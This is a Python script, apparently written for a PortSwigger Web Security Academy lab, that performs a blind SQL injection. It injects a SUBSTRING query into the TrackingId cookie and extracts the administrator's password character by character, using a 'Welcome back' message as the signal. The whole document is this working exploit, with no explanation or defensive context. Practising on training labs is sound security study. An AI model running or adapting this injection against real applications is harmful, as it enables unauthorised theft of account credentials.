import requests as req
import string

url = "https://0a4200cd0496a0d681044e9e00a2001d.web-security-academy.net/"
all = string.printable
password = ""

for passchar in range(1,30):
    for j in all:
        exploit = f"Txk1LRuBeGQVCllJ\' AND SUBSTRING((SELECT password FROM users WHERE username=\'administrator\'),{passchar},1) = \'{j}\'-- -"
        payload = {'TrackingId' : exploit, 'session': 'IJXbd4NLIlNrjAIXlTIKUnItyHaEansv'}
        proxies = {'http': 'http://127.0.0.1:8080'}
        #print(payload)
        print('testing ' + j)
        r = req.get(url, cookies=payload)#proxies=proxies,verify=False)
        #print(r.text)
        if "Welcome back" in r.text:
            password+= j
            print(j)
            break
print(password)
